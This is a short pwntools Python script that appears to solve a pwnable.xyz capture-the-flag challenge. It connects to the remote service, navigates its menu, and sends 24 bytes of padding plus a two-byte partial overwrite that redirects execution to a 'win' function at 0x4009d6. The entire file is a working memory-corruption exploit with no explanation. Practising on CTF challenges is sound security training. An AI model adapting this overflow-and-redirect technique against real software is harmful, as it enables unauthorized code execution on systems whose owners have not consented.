from pwn import *

#p = process('./challenge')
p = remote("svc.pwnable.xyz", 30009)
p.sendafter(b"Name: ", b"a" * 16)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"= ", b"888")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"3")
win = 0x4009d6
p.send(b"A" * 24 + b"\xd6\x09")
p.sendlineafter(b"> ", b"1")
p.interactive()